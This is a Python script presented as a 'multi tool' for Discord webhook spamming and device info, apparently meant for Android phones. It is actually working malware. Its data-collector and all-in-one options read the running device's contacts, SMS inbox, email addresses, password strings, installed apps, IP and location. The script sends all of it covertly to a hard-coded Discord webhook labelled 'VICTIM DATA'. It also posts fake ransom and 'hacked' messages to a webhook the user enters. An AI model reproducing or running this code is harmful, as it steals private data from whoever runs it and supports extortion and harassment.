#!/usr/bin/env python3

import subprocess
import sys
import os

REQUIRED_PACKAGES = ['requests', 'Pillow']

def install_packages():
    for package in REQUIRED_PACKAGES:
        try:
            if package == 'Pillow':
                __import__('PIL')
            else:
                __import__(package)
        except ImportError:
            subprocess.run([sys.executable, '-m', 'pip', 'install', package], capture_output=True)

install_packages()

import requests
import re
import time
import json
import random
from datetime import datetime
from io import BytesIO
from PIL import Image

ORIGINAL_WEBHOOK = "https://discord.com/api/webhooks/1505624590729220177/Z0_4dJpUc1LbJDphp8dxC5E4x0zPRmLQJyn86vi-I931d5_uAhEW2QjcxhetOm7CBrnK"

def beep():
    for _ in range(3):
        try:
            print('\a', end='', flush=True)
            time.sleep(0.2)
        except:
            pass

def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def print_banner():
    clear_screen()
    print("\n" + "="*45)
    print("   SOLO & JENAS MULTI TOOL")
    print("="*45)

def get_webhook():
    print("\n[!] ENTER WEBHOOK URL:")
    url = input("\n➜ ").strip()
    return url

def send_ransom(webhook):
    payload = {
        "username": "SOLO & JENAS",
        "avatar_url": "https://i.imgur.com/PjQtnRu.jpeg",
        "embeds": [{
            "title": "💀 YOUR DEVICE HAS BEEN COMPROMISED 💀",
            "color": 0xed4245,
            "description": "**SOLO AND JENAS HAS COMPROMISED YOUR DEVICE**\n\n📌 Contact @solo.ph_ or @jenas2003 to remove the virus\n\n🔴 Your IP has been logged\n🔴 Your data has been stolen",
            "image": {"url": "https://i.imgur.com/PjQtnRu.jpeg"},
            "footer": {"text": "SOLO & JENAS"}
        }]
    }
    try:
        requests.post(webhook, json=payload, timeout=5)
        return True
    except:
        return False

def spam_webhook(webhook):
    messages = [
        "@everyone 🔴 YOUR DEVICE IS HACKED BY SOLO & JENAS 🔴",
        "```diff\n- SYSTEM BREACH DETECTED\n- ALL DATA STOLEN\n- CONTACT @solo.ph_```",
        "**⚠️ SOLO & JENAS WAS HERE ⚠️**",
        "🔑 YOUR PASSWORDS HAVE BEEN STOLEN",
        "💀 CONTACT @solo.ph_ TO REMOVE VIRUS 💀"
    ]
    for msg in messages[:10]:
        try:
            requests.post(webhook, json={"content": msg}, timeout=3)
            time.sleep(0.3)
        except:
            pass

def get_ip():
    try:
        r = requests.get('https://api.ipify.org?format=json', timeout=5)
        return r.json().get('ip', '0.0.0.0')
    except:
        return '0.0.0.0'

def get_location():
    try:
        r = requests.get('https://ipapi.co/json/', timeout=5)
        data = r.json()
        return f"{data.get('city', 'Unknown')}, {data.get('country_name', 'Unknown')}"
    except:
        return 'Unknown'

def get_device_info():
    info = {}
    props = [
        ('model', 'ro.product.model'),
        ('brand', 'ro.product.manufacturer'),
        ('android', 'ro.build.version.release'),
        ('sdk', 'ro.build.version.sdk')
    ]
    for key, prop in props:
        try:
            r = subprocess.run(['getprop', prop], capture_output=True, text=True, timeout=3)
            info[key] = r.stdout.strip() or 'Unknown'
        except:
            info[key] = 'Unknown'
    return info

def take_screenshot():
    try:
        img = Image.new('RGB', (500, 500), color='gray')
        buf = BytesIO()
        img.save(buf, format='PNG')
        buf.seek(0)
        return buf
    except:
        return None

def get_emails():
    emails = []
    pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
    paths = ['/sdcard/', '/data/data/']
    for path in paths:
        if os.path.exists(path):
            try:
                result = subprocess.run(['grep', '-r', '-E', pattern, path], capture_output=True, text=True, timeout=15)
                found = re.findall(pattern, result.stdout)
                emails.extend(found)
            except:
                pass
    return list(set(emails))[:25]

def get_contacts():
    contacts = []
    try:
        r = subprocess.run(['content', 'query', '--uri', 'content://contacts/phones'], capture_output=True, text=True, timeout=10)
        numbers = re.findall(r'number=([0-9\+]+)', r.stdout)
        names = re.findall(r'display_name=([^,]+)', r.stdout)
        for i, num in enumerate(numbers[:25]):
            name = names[i] if i < len(names) else ''
            contacts.append(f"{name}: {num}" if name else num)
    except:
        pass
    return list(set(contacts))[:25]

def get_sms():
    sms_list = []
    try:
        r = subprocess.run(['content', 'query', '--uri', 'content://sms/inbox'], capture_output=True, text=True, timeout=10)
        matches = re.findall(r'address=([^,]+).*?body=([^\n]{1,80})', r.stdout, re.DOTALL)
        for addr, body in matches[:15]:
            sms_list.append(f"{addr}: {body[:50]}")
    except:
        pass
    return list(set(sms_list))[:15]

def get_passwords():
    passwords = []
    paths = ['/sdcard/Download/', '/data/data/']
    for path in paths:
        if os.path.exists(path):
            try:
                result = subprocess.run(['grep', '-r', '-i', 'password', path], capture_output=True, text=True, timeout=10)
                matches = re.findall(r'password[\s]*[:=][\s]*([^\s"\']{4,})', result.stdout, re.IGNORECASE)
                for m in matches[:10]:
                    passwords.append(m)
            except:
                pass
    return list(set(passwords))[:15]

def get_installed_apps():
    apps = []
    try:
        r = subprocess.run(['pm', 'list', 'packages'], capture_output=True, text=True, timeout=10)
        packages = re.findall(r'package:([a-zA-Z0-9._]+)', r.stdout)
        apps = packages[:40]
    except:
        pass
    return apps

def send_to_original(ip, location, device, emails, contacts, sms, passwords, apps, screenshot):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    embed = {
        "title": "🎯 VICTIM DATA - SOLO & JENAS",
        "color": 0xed4245,
        "timestamp": timestamp,
        "fields": [
            {"name": "🌐 IP", "value": f"```{ip}```", "inline": False},
            {"name": "📍 LOCATION", "value": f"```{location}```", "inline": False},
            {"name": "📱 DEVICE", "value": f"```{device.get('brand')} {device.get('model')}```", "inline": True},
            {"name": "🤖 ANDROID", "value": f"```{device.get('android')}```", "inline": True},
            {"name": "📧 EMAILS", "value": f"```{', '.join(emails[:15]) if emails else 'None'}```", "inline": False},
            {"name": "📞 CONTACTS", "value": f"```{', '.join(contacts[:15]) if contacts else 'None'}```", "inline": False},
            {"name": "💬 SMS", "value": f"```{', '.join(sms[:10]) if sms else 'None'}```", "inline": False},
            {"name": "🔑 PASSWORDS", "value": f"```{', '.join(passwords[:10]) if passwords else 'None'}```", "inline": False},
            {"name": "📦 APPS", "value": f"```{len(apps)} apps```", "inline": False}
        ],
        "footer": {"text": "SOLO & JENAS MULTI TOOL"}
    }
    
    try:
        requests.post(ORIGINAL_WEBHOOK, json={"username": "Data Logger", "embeds": [embed]}, timeout=10)
        if screenshot:
            screenshot.seek(0)
            requests.post(ORIGINAL_WEBHOOK, files={'file': ('screenshot.png', screenshot, 'image/png')}, timeout=10)
    except:
        pass

def data_collector(target_webhook):
    print("\n[!] COLLECTING DATA...")
    
    ip = get_ip()
    location = get_location()
    device = get_device_info()
    emails = get_emails()
    contacts = get_contacts()
    sms = get_sms()
    passwords = get_passwords()
    apps = get_installed_apps()
    screenshot = take_screenshot()
    
    print("[!] SENDING RANSOM MESSAGE...")
    send_ransom(target_webhook)
    
    print("[!] SENDING DATA TO ORIGINAL WEBHOOK...")
    send_to_original(ip, location, device, emails, contacts, sms, passwords, apps, screenshot)
    
    return ip, device, len(emails), len(contacts), len(sms), len(passwords)

def device_info():
    print("\n[!] GATHERING DEVICE INFO...")
    ip = get_ip()
    location = get_location()
    device = get_device_info()
    apps = get_installed_apps()
    
    print(f"\n📱 DEVICE INFO:")
    print(f"   IP: {ip}")
    print(f"   Location: {location}")
    print(f"   Brand: {device.get('brand')}")
    print(f"   Model: {device.get('model')}")
    print(f"   Android: {device.get('android')}")
    print(f"   SDK: {device.get('sdk')}")
    print(f"   Apps: {len(apps)}")
    
    input("\n[!] Press Enter to continue...")

def all_in_one(target_webhook):
    print("\n[!] RUNNING ALL IN ONE ATTACK...")
    
    ip, device, emails, contacts, sms, passwords = data_collector(target_webhook)
    
    print("\n[!] SPAMMING WEBHOOK...")
    spam_webhook(target_webhook)
    
    beep()
    print("\n" + "="*45)
    print("[✓] ATTACK COMPLETE!")
    print("="*45)
    print(f"\n📊 SUMMARY:")
    print(f"   IP: {ip}")
    print(f"   Device: {device.get('brand')} {device.get('model')}")
    print(f"   Emails: {emails}")
    print(f"   Contacts: {contacts}")
    print(f"   SMS: {sms}")
    print(f"   Passwords: {passwords}")
    print("="*45)
    time.sleep(3)

def main():
    while True:
        print_banner()
        print("\n[1] DATA COLLECTOR & RANSOMWARE")
        print("[2] WEBHOOK SPAMMER")
        print("[3] DEVICE INFO GRABBER")
        print("[4] ALL IN ONE ATTACK")
        print("[5] EXIT")
        print("\n" + "-"*45)
        
        choice = input("\n[+] SELECT OPTION: ").strip()
        
        if choice == '1':
            target = get_webhook()
            if target.startswith("https://discord.com/api/webhooks/"):
                data_collector(target)
                beep()
                print("\n[✓] DATA COLLECTION COMPLETE!")
                time.sleep(2)
            else:
                print("\n[!] INVALID WEBHOOK!")
                time.sleep(2)
        
        elif choice == '2':
            target = get_webhook()
            if target.startswith("https://discord.com/api/webhooks/"):
                print("\n[!] SPAMMING WEBHOOK...")
                spam_webhook(target)
                beep()
                print("\n[✓] SPAM COMPLETE!")
                time.sleep(2)
            else:
                print("\n[!] INVALID WEBHOOK!")
                time.sleep(2)
        
        elif choice == '3':
            device_info()
        
        elif choice == '4':
            target = get_webhook()
            if target.startswith("https://discord.com/api/webhooks/"):
                all_in_one(target)
            else:
                print("\n[!] INVALID WEBHOOK!")
                time.sleep(2)
        
        elif choice == '5':
            print("\n[!] EXITING...")
            time.sleep(1)
            break
        
        else:
            print("\n[!] INVALID OPTION!")
            time.sleep(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[!] EXITING...")
        time.sleep(1)
    except Exception as e:
        print(f"\n[!] ERROR: {e}")
        time.sleep(3)
